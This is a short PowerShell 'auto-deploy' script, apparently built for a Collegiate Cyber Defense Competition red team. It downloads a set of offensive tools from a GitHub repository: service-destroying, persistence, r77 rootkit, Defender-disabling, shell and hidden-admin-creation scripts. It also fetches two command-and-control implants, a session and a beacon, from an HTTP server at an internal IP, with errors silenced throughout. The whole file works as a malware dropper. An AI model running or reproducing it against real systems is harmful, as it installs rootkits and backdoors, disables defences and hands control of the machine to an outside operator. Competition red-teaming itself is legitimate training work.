# CCDC Phase 3 - Auto Deploy
# Downloads all Phase 3 scripts and implants to the current device in one shot.

$ErrorActionPreference = "SilentlyContinue"

Write-Host "[*] Starting Phase 3 auto-deploy..." -ForegroundColor Cyan

$downloads = @(
    @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_ServiceDestroyer.ps1";           OutFile = "servicesDestroy.ps1" },
    @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_Persist_MegaNukerOfDeath.ps1";  OutFile = "persist1.ps1" },
    @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_Rootkit_r77Shadow.ps1";        OutFile = "r77.ps1" },
    @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_Defender_BreakingBad.ps1";    OutFile = "defender.ps1" },
    @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_Rootkit_r77HideServices.ps1"; OutFile = "r77hide.ps1" },
    @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_Shell_ShellShock.ps1";        OutFile = "shellshock.ps1" },
    @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_2_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P2_PowerShell_ScriptKill.ps1";   OutFile = "pskill.ps1" },
    @{ Uri = "https://raw.githubusercontent.com/Whitneyk7878/CCDC_Red_Team_Tools/refs/heads/main/Phase_3_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_P3_CreateGhostAdmins.ps1";       OutFile = "ghostadmins.ps1" },
    @{ Uri = "http://172.31.40.6:8882/IMPLANT_SESSION_WINDOWS_HTTP_8008";  OutFile = "ses08" },
    @{ Uri = "http://172.31.40.6:8882/IMPLANT_BEACON_WINDOWS_HTTP_8007";   OutFile = "beac07" }
)

foreach ($item in $downloads) {
    Write-Host "[*] Downloading $($item.OutFile)..." -ForegroundColor Yellow
    try {
        Invoke-WebRequest -Uri $item.Uri -OutFile $item.OutFile -UseBasicParsing
        Write-Host "[+] $($item.OutFile) OK" -ForegroundColor Green
    } catch {
        Write-Host "[-] Failed: $($item.OutFile) - $_" -ForegroundColor Red
    }
}

Write-Host "[*] Auto-deploy complete." -ForegroundColor Cyan
